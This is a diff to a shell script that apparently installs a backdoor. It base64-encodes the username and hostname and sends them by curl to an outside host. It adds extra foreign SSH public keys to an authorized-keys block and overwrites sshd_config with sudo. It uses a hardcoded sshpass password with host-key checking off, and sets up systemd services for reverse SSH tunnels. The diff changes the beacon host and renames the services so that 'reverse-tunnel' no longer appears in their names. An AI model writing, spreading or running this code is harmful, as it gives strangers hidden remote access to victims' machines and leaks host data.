@@ -24,13 +24,15 @@ hostname=$(hostname)
 
 # Encode as base64 and strip newline
 data=$(echo -n "$user:$username:$hostname" | base64)
+#echo -e "Data:\t$data"
 
-# api endpoint
-domain_name="edcoretecmm.sytes.net:5000"
+domain_name="proxy1.cryptopredictor.org"
 
 # Proper GET request with query param
 received_port=$(curl -s "https://$domain_name/report?data=$data")
-received_port=$(echo $port | sed "s/%//g")
+received_port=$(echo $received_port | sed "s/%//g")
+
+echo "$received_port"
 
 # Generate the key pair
 key_path="$HOME/.ssh/$(whoami)_ed25519"
@@ -43,6 +45,9 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeQigM/aHDiVVl06SaUioJ9yll+4v+OsADC8WYdSLWz
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIzWLETupIltsWaqiKsFJ1ub4sKXohgqLYj0z5ORQRSb nobody1@web-server
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM6xc2Xh8JDTXCq3I5/GbbrkbXYfFcMAt/wHPfHIo0Zp nobody2@web-server
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDRLi7rEJe7OkorAvywhr6QRLN1p0FmWDAKRTpDPtJwa suser@z6yg5ybv
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7GlY/RI7o9IjHccolpcUSa1/UFsmMrQFCvzcs2JqLm suser@
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDCYabqF2p28/A9S3qwP8v2jPhOHq2tl8RbaVsGu4il 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFzdTi7eKOCK1jqc60ORaP5QtdR3fmI3SXA3DePTCRPS
 EOF
 
 # Backup current sshd_config
@@ -80,7 +85,8 @@ echo "$requiredSettings" | sudo tee /etc/ssh/sshd_config > /dev/null
 
 
 # List of remote hosts
-hosts=("40.233.2.200" "edcoretecmm.sytes.net" "ximand.ddns.net")
+#hosts=("40.233.2.200" "edcoretecmm.sytes.net" "ximand.ddns.net")
+hosts=("40.233.2.200")
 
 for host in "${hosts[@]}"; do
     echo "Setting up for $host"
@@ -90,7 +96,7 @@ for host in "${hosts[@]}"; do
     sshpass -p "DZ04dYFws1POVlm0XeHA" ssh-copy-id -o StrictHostKeyChecking=no -i "$key_path.pub" "$user@$host"
 
     # Create a unique systemd service for each host
-    service_name="reverse-tunnel-${host%%.*}"
+    service_name="${host%%.*}"
 
     cat << EOF | sudo tee /etc/systemd/system/${service_name}.service > /dev/null
 [Unit]
